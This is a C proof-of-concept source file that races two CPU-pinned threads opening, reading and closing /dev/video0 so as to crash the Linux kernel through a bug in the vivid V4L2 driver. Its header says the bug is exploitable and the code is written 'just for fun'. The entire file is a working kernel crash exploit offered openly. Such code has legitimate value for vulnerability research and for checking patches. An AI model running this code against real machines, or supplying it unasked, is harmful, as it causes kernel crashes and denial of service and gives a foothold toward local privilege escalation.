/*
 * PoC crashing the kernel using the bug in drivers/media/platform/vivid.
 * Turned out that this bug is exploitable.
 * Just for fun.
 */

#define _GNU_SOURCE

#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/mman.h>

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define THREADS_N 2
#define LOOP_N 10000

unsigned char *buf = NULL;

void *racer(void *arg)
{
	unsigned long n = (unsigned long)arg;
	unsigned long cpu_n = n % 2;
	cpu_set_t single_cpu;
	int ret = 0;
	unsigned long loop = 0;

	CPU_ZERO(&single_cpu);
	CPU_SET(cpu_n, &single_cpu);
	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0)
		err_exit("[-] sched_setaffinity for a single CPU");

	printf("[+] racer #%lu is on the start on CPU %lu\n", n, cpu_n);

	for (loop = 0; loop < LOOP_N; loop++) {
		int fd = 0;

		/* printf("  racer %lu, loop %lu\n", n, loop); */

		fd = open("/dev/video0", O_RDWR);
		if (fd < 0)
			err_exit("[-] open /dev/video0");

		read(fd, buf, 0xfffded);
		close(fd);

		usleep(n);
	}

	return NULL;
}

int main(void)
{
	int ret = -1;
	cpu_set_t all_cpus;
	pthread_t th[THREADS_N] = { 0 };
	long i = 0;

	printf("[!] gonna work with /dev/video0\n");
	printf("[!] please check that:\n");
	printf("\t vivid driver is loaded\n");
	printf("\t /dev/video0 is the V4L2 capture device\n");
	printf("\t you are logged in (Ubuntu adds RW ACL for /dev/video0)\n");

	ret = sched_getaffinity(0, sizeof(all_cpus), &all_cpus);
	if (ret != 0)
		err_exit("[-] sched_getaffinity");

	if (CPU_COUNT(&all_cpus) < 2) {
		printf("[-] not enough CPUs for racing\n");
		exit(EXIT_FAILURE);
	}

	printf("[+] we have %d CPUs for racing\n", CPU_COUNT(&all_cpus));
	fflush(NULL);

	buf = mmap(NULL, 0x1000000, PROT_READ | PROT_WRITE,
					MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (buf == MAP_FAILED)
		err_exit("[-] mmap");
	else
		printf("[+] buf for reading is mmaped at %p\n", buf);

	for (i = 0; i < THREADS_N; i++) {
		ret = pthread_create(&th[i], NULL, racer, (void *)i);
		if (ret != 0)
			err_exit("[-] pthread_create for racer");
	}

	for (i = 0; i < THREADS_N; i++) {
		ret = pthread_join(th[i], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join");
	}

	printf("[-] racing is failed, try it again\n");

	exit(EXIT_FAILURE);
}

